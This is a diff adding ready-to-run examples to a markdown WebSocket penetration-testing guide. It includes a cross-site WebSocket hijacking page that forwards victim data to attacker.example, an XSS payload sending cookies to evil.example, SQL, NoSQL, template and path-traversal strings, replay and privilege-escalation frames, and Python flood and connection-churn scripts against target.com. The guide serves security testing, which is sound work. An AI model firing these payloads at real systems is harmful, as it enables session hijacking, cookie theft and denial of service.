@@ -78,7 +78,49 @@ The WebSocket protocol does not enforce same-origin policy at the browser level.
 
 ### Malicious Page Template
 
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const ws = new WebSocket("wss://target.com/ws");
+  ws.onopen = () => {
+    console.log("CSWSH: connected with victim cookies");
+    ws.send(JSON.stringify({action:"getProfile"}));
+    ws.send(JSON.stringify({action:"listSessions"}));
+  };
+  ws.onmessage = (e) => {
+    fetch("https://attacker.example/collect", {
+      method: "POST", body: e.data
+    });
+  };
+</script>
+</body>
+</html>
+```
+
+Host on `https://attacker.example` and get the victim to visit — cookie-based auth is attached automatically by the browser.
+
 ### Origin Validation Checks
+
+```http
+GET /ws HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Origin: https://evil.example
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Cookie: session=legitimate-session-cookie
+```
+
+Also test:
+
+```http
+Origin: null
+```
+
+(sandboxed iframes send a `null` origin — some validators only reject known-bad origins) and subdomain variants (`https://target.com.evil.example`). A `101 Switching Protocols` response to any of these confirms missing/weak validation.
 - Does server send `Access-Control-Allow-Origin` on the 101 response?
 - Does server echo back the request Origin without validation?
 - Can you connect with a completely random Origin header?
@@ -119,11 +161,26 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 4. Send modified messages and observe server response
 5. Check if unauthorized state changes occur
 
+**Replay + tampered frames:**
+
+```json
+{"type":"message","userId":"8412","room":"general","body":"hello","ts":1719000000}
+{"type":"message","userId":"9999","room":"general","body":"sent as another user","ts":1719000001}
+{"type":"transfer","fromAccount":"8412","toAccount":"6666","amount":100,"nonce":"replay-same-nonce"}
+```
+
+Send the original transfer frame twice — if the server processes both, idempotency/replay protection is missing.
+
 ### Message Format Analysis
 - Parse incoming messages for JSON structure
 - Note field names: `userId`, `role`, `action`, `type`, `permission`
 - Identify which fields are server-validated vs client-only
 - Check if messages are signed or integrity-protected
+
+```json
+{"type":"message","userId":"8412","room":"general","body":"hello","ts":1719000000}
+```
+
 
 ## Authentication Testing
 
@@ -132,6 +189,17 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Test with expired tokens — does server close the connection?
 - Test with tokens from other users/sessions
 - Check if auth is checked at upgrade or lazily on first message
+
+```http
+GET /ws HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+```
+
+If the handshake returns `101` with no cookies and no `Authorization` header, authentication is lazy (per-message or absent).
 
 ### Token in URL (Insecure)
 - If auth token is in query string (`?token=xxx`), it leaks in:
@@ -159,10 +227,24 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Subscribe to channels/rooms the authenticated user should not access
 - Request data for other users via message parameters
 
+```json
+{"type":"getMessages","room":"user/8412/private"}
+{"type":"fetchDocument","docId":"doc_9999"}
+{"type":"subscribe","channel":"payments/user/8412"}
+```
+
+
 ### Vertical Privilege Escalation
 - Attempt admin-only operations via WS messages
 - Send messages requiring elevated roles
 - Test if role checks happen server-side per message or only at connection
+
+```json
+{"type":"admin","action":"listAllUsers"}
+{"type":"admin","action":"deleteUser","userId":"8412"}
+{"role":"ADMIN","type":"exec","command":"flushCache"}
+```
+
 
 ### Channel/Room Authorization
 - Join rooms/channels the user is not subscribed to
@@ -178,6 +260,19 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Test if large messages cause memory exhaustion or crashes
 - Monitor server response times during large message sends
 
+```python
+import asyncio, websockets
+
+async def main():
+    async with websockets.connect("wss://target.com/ws") as ws:
+        payload = "A" * (10 * 1024 * 1024)  # 10MB
+        await ws.send('{"type":"message","body":"' + payload + '"}')
+        print(await ws.recv())
+
+asyncio.run(main())
+```
+
+
 ### Malformed Data
 - Send non-JSON data when JSON is expected
 - Send deeply nested JSON objects (stack overflow potential)
@@ -185,12 +280,30 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Send binary frames when text is expected and vice versa
 - Send empty frames, null bytes, unterminated JSON
 
+```json
+"just-a-string"
+{"type":"message","body":"\ud800"}
+{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}
+{"type":"message","body":"unterminated
+```
+
+Plus raw binary frames (`b"\x00\xff\x00"`) and empty text frames — a server that 500s or drops the connection on any of these has no schema validation layer.
+
 ### Injection Payloads in Messages
 - SQL injection in string fields: `'; DROP TABLE users; --`
 - XSS in chat messages: `<script>alert(1)</script>`, `<img onerror=...>`
 - NoSQL injection: `{"$gt": ""}`, `{"$ne": null}`
 - Template injection: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
 - Path traversal in file references: `../../etc/passwd`
+
+```json
+{"type":"message","room":"general","body":"'; DROP TABLE users; --"}
+{"type":"message","room":"general","body":"<img src=x onerror=fetch('//evil.example/'+document.cookie)>"}
+{"type":"search","query":{"$ne":""}}
+{"type":"render","template":"{{7*7}}"}
+{"type":"openFile","path":"../../etc/passwd"}
+```
+
 
 ### Schema Validation Bypass
 - Remove required fields from JSON messages
@@ -206,11 +319,39 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Check if rate limiting is global (affects all users) or per-connection
 - Monitor server resource usage during flood
 
+```python
+import asyncio, websockets, json
+
+async def flood():
+    async with websockets.connect("wss://target.com/ws") as ws:
+        msg = json.dumps({"type":"message","room":"general","body":"flood"})
+        for i in range(1000):
+            await ws.send(msg)
+
+asyncio.run(flood())
+```
+
+
 ### Connection Flood
 - Open many concurrent WebSocket connections from same source
 - Test if server limits total connections per IP/user
 - Check connection limits per session
 - Test connection churn (rapid open/close cycles)
+
+```python
+import asyncio, websockets
+
+async def churn():
+    for _ in range(50):
+        ws = await websockets.connect("wss://target.com/ws")
+        await ws.close()
+
+async def main():
+    await asyncio.gather(*[churn() for _ in range(20)])
+
+asyncio.run(main())
+```
+
 
 ### Asymmetric Load
 - Send messages that trigger expensive server processing
@@ -237,11 +378,40 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Test if server enforces subprotocol-specific message formats
 - Negotiate multiple subprotocols simultaneously
 
+```http
+GET /ws HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Protocol: graphql-ws, v1.chat.json, nonexistent-proto
+```
+
+
 ### Close Frame Manipulation
 - Send close frames with different status codes
 - Send close frames with payload data
 - Test if server properly handles abnormal closures
 - Check if server cleans up resources on abnormal close
+
+```python
+import asyncio, websockets
+
+async def main():
+    ws = await websockets.connect("wss://target.com/ws")
+    await ws.send('{"type":"subscribe","channel":"updates"}')
+    # abnormal close codes the RFC reserves / forbids clients from sending
+    for code in (1006, 1015, 0, 2999, 5000):
+        try:
+            await ws.close(code=code)
+            ws = await websockets.connect("wss://target.com/ws")
+        except Exception as e:
+            print(code, "->", type(e).__name__)
+
+asyncio.run(main())
+```
+
 
 ### Ping/Pong Abuse
 - Send rapid ping frames
@@ -249,12 +419,36 @@ Inject unauthorized messages into authenticated WebSocket sessions.
 - Test if server responds to pings (resource consumption)
 - Check if missing pong responses trigger disconnect
 
+```python
+import asyncio, websockets
+
+async def main():
+    async with websockets.connect("wss://target.com/ws") as ws:
+        for _ in range(500):
+            await ws.ping(b"P" * 1024)  # oversized ping payloads
+        await asyncio.sleep(2)
+
+asyncio.run(main())
+```
+
+
 ### Socket.IO Specific
 - Test Engine.IO transport upgrade (polling → websocket)
 - Manipulate `EIO` parameter (v3 vs v4 protocol differences)
 - Test `sid` parameter reuse across connections
 - Check for path traversal in Socket.IO namespace routing
 - Test binary vs text frame handling differences
+
+```http
+GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+```
+
+Toggle `EIO=3` ↔ `EIO=4`, reuse a captured `&sid=` from another session, and probe namespaces (`/admin`, `/../../etc`) with `40` + namespace-connect frames.
 
 ## Anti-Hallucination
 
